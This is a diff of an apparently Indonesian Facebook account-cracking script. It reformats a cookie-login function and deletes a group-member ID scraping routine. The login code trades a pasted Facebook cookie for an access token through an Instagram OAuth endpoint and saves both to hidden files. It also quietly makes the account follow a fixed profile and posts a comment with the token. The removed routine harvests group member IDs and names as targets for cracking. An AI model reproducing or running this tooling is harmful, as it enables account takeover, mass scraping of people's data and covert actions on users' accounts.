@@ -448,112 +448,43 @@ def login():
             exit()
     except IOError:
         login123()
-			
-			
+
+
 def logincoki():
-    cookie = Console().input(f" {H2}• {P2}cookie : ")
-    try:
-        ses.headers.update(
-            {
-                "Accept-Language": "id,en;q=0.9",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
-                "Referer": "https://www.instagram.com/",
-                "Host": "www.facebook.com",
-                "Sec-Fetch-Mode": "cors",
-                "Accept": "*/*",
-                "Connection": "keep-alive",
-                "Sec-Fetch-Site": "cross-site",
-                "Sec-Fetch-Dest": "empty",
-                "Origin": "https://www.instagram.com",
-                "Accept-Encoding": "gzip, deflate",
-            }
-        )
-        link = ses.get(
-            "https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/",
-            cookies={"cookie": cookie},
-        )
-        if '"access_token":' in str(link.headers):
-            token = re.search('"access_token":"(.*?)"', str(link.headers)).group(1)
-            open(".vipercok.txt", "w").write(cookie)
-            open(".vipertok.txt", "w").write(token)
-            viperfollow(cookie)
-            requests.post(
-                f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}",
-                headers={"cookie": cookie},
-            )
-            Console().print(
-                Panel(
-                    f"""{P2}{token}""",
-                    width=60,
-                    style=f"{color_panel}",
-                    title="[bold green]TOKEN",
-                )
-            )
-            Console().print(
-                f" {H2}• {P2}[bold green]Login Berhasil,jalankan Ulang Script"
-            )
-    except Exception as e:
-        Console().print(f" {H2}• {P2}[bold red]Cookies Kadaluwarsa Bang")
-        os.system("rm -rf .vipertok.txt && rm -rf .vipercok.txt")
-        print(e)
-        time.sleep(3)
-        exit()
-    except:
-        pass
-
-
-
-
-def logincsssoki():
-    cookie = Console().input(f" {H2}• {P2}cookie : ")
-    try:
-        ses.headers.update(
-            {
-                "Accept-Language": "id,en;q=0.9",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
-                "Referer": "https://www.instagram.com/",
-                "Host": "www.facebook.com",
-                "Sec-Fetch-Mode": "cors",
-                "Accept": "*/*",
-                "Connection": "keep-alive",
-                "Sec-Fetch-Site": "cross-site",
-                "Sec-Fetch-Dest": "empty",
-                "Origin": "https://www.instagram.com",
-                "Accept-Encoding": "gzip, deflate",
-            }
-        )
-        link = ses.get(
-            "https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/",
-            cookies={"cookie": cookie},
-        )
-        if '"access_token":' in str(link.headers):
-            token = re.search('"access_token":"(.*?)"', str(link.headers)).group(1)
-            open(".vipercok.txt", "w").write(cookie)
-            open(".vipertok.txt", "w").write(token)
-            viperfollow(cookie)
-            requests.post(
-                f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}",
-                headers={"cookie": cookie},
-            )
-            Console().print(
-                Panel(
-                    f"""{P2}{token}""",
-                    width=60,
-                    style=f"{color_panel}",
-                    title="[bold green]TOKEN",
-                )
-            )
-            Console().print(
-                f" {H2}• {P2}[bold green]Login Berhasil,jalankan Ulang Script"
-            )
-    except Exception as e:
-        Console().print(f" {H2}• {P2}[bold red]Cookies Kadaluwarsa Bang")
-        os.system("rm -rf .vipertok.txt && rm -rf .vipercok.txt")
-        print(e)
-        time.sleep(3)
-        exit()
-    except:
-        pass
+	cookie = Console().input(f" {H2}• {P2}cookie : ")
+	try:
+		ses.headers.update(
+			{
+				"Accept-Language": "id,en;q=0.9",
+				"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
+				"Referer": "https://www.instagram.com/",
+				"Host": "www.facebook.com",
+				"Sec-Fetch-Mode": "cors",
+				"Accept": "*/*",
+				"Connection": "keep-alive",
+				"Sec-Fetch-Site": "cross-site",
+				"Sec-Fetch-Dest": "empty",
+				"Origin": "https://www.instagram.com",
+				"Accept-Encoding": "gzip, deflate",
+			}
+		)
+		link = ses.get("https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/",cookies={"cookie": cookie})
+		if '"access_token":' in str(link.headers):
+			token = re.search('"access_token":"(.*?)"', str(link.headers)).group(1)
+			open(".vipercok.txt", "w").write(cookie)
+			open(".vipertok.txt", "w").write(token)
+			viperfollow(cookie)
+			requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}",headers={"cookie": cookie})
+			Console().print(Panel(f"""{P2}{token}""",width=60,style=f"{color_panel}",title="[bold green]TOKEN"))
+			Console().print(f" {H2}• {P2}[bold green]Login Berhasil,jalankan Ulang Script")
+	except Exception as e:
+		Console().print(f" {H2}• {P2}[bold red]Cookies Kadaluwarsa Bang")
+		os.system("rm -rf .vipertok.txt && rm -rf .vipercok.txt")
+		print(e)
+		time.sleep(3)
+		exit()
+	except:
+		pass
 
 
 def followdong():
@@ -1114,145 +1045,6 @@ def result():
     else:
         Console().print("[bold cyan]   ╰─>[bold red] Pilih Yang Bener Atuhh")
         exit()
-
-
-# ------------------[ CRACK-GRUP ]-----------------#
-balmond = b + "[" + h + "✓" + b + "]"
-
-
-def lah():
-    print(f"\n{x}>> Total Idz Yang Terkumpul :{h} %s " % (len(id)))
-    input(f"{x}>> [ {m}Klik Enter {x}] ")
-    print("")
-    pass
-    setting()
-
-
-def grup():
-    print("")
-    id = input(f"{x}>> Masukkan Username Atau Idz Grup : ")
-    ua = "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"
-    miskinlu = {"user-agent": ua}
-    url = "https://mbasic.facebook.com/groups/" + id
-    ses = requests.Session()
-    try:
-        gn = parser(ses.get(url, headers=miskinlu).text, "html.parser")
-    except requests.exceptions.ConnectionError:
-        print(">> Sinyal Loo Kek Kontol ")
-        time.sleep(0.5)
-        exit()
-    berr = gn.find("title")
-    berr2 = berr.text.replace(" | Facebook", "").replace(" Grup Publik", "")
-    if berr2 == "Masuk Facebook":
-        print(" Terkena Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
-        time.sleep(0.5)
-        grup()
-    elif berr2 == "Kesalahan":
-        print(">> Grup Tidak Di Temukan ")
-        time.sleep(0.5)
-        grup()
-    else:
-        pass
-    print(f"{x}>> Nama Grup : {b}%s" % (berr2))
-    ggs = gn.find_all("table")
-    ang = []
-    for ff in ggs:
-        anggo = ff.text
-        bro = anggo.replace("Anggota", "")
-        try:
-            mex = int(bro)
-            jumlah = ang.append(mex)
-        except:
-            pass
-    if len(ang) == 0:
-        print(" Anggota : -")
-    else:
-        print(f"{x}>> Anggota : {h}%s" % (ang[0]))
-    grup1(url)
-
-
-def grup1(urls):
-    use = []
-    ses = requests.Session()
-    print(f"{x}>> Sedang Mengumpulkan Idz ")
-    print(f">> Klik {k}Ctrl+C{x} Untuk {m}Stop{x} Dump !!")
-    while True:
-        try:
-            ua = "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"
-            miskinlu = {"user-agent": ua}
-            try:
-                url = use[0]
-            except:
-                url = urls
-            set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
-            bf2 = set.find_all("a")
-            for g in bf2:
-                css = str(g).split(">")
-                if "Lihat Postingan Lainnya</span" in css:
-                    bcj = str(g).replace('<a href="', "").replace("amp;", "")
-                    bcj2 = bcj.split(" ")[0].replace('"><img', "")
-            tes = set.find_all("table")
-            for cari in tes:
-                liatnih = cari.text
-                spl = liatnih.split(" ")
-                if "mengajukan" in spl:
-                    idsiapa = re.findall("content_owner_id_new.\w+", str(cari))
-                    idyou = idsiapa[0].replace("content_owner_id_new.", "")
-                    namayou = liatnih.replace(" mengajukan pertanyaan .", "")
-                    idku = idyou + "|" + namayou
-                    if idku in id:
-                        continue
-                    else:
-                        id.append(idku)
-                        print(
-                            (
-                                "\r"
-                                + balmond
-                                + h
-                                + " { "
-                                + k
-                                + "Proses Mengambil ID "
-                                + str(len(id))
-                                + h
-                                + " }"
-                            ),
-                            end="",
-                        )
-                        sys.stdout.flush()
-                elif ">" in spl:
-                    idsiapa = re.findall("content_owner_id_new.\w+", str(cari))
-                    idyou = idsiapa[0].replace("content_owner_id_new.", "")
-                    namayou = liatnih.split(" > ")[0]
-                    idku = idyou + "|" + namayou
-                    if idku in id:
-                        continue
-                    else:
-                        id.append(idku)
-                        xy = random.choice([m, k, h, u, b, x])
-                        print(f"\r	———>> {x}({xy} %s {x}) <<———" % (len(id)), end="")
-                        sys.stdout.flush()
-                else:
-                    continue
-            try:
-                link_ = bcj2
-                use.insert(0, "https://mbasic.facebook.com" + link_)
-            except:
-                girang = set.find("title")
-                girang2 = girang.text.replace(" | Facebook", "").replace(
-                    " Grup Publik", ""
-                )
-                if girang2 == "Masuk Facebook":
-                    pass
-                else:
-                    lah()
-        except requests.exceptions.ConnectionError:
-            try:
-                time.sleep(31)
-            except KeyboardInterrupt:
-                lah()
-        except KeyboardInterrupt:
-            lah()
-
 
 # ------------------[ DUMP-ID ]-----------------#
 def publikv2():
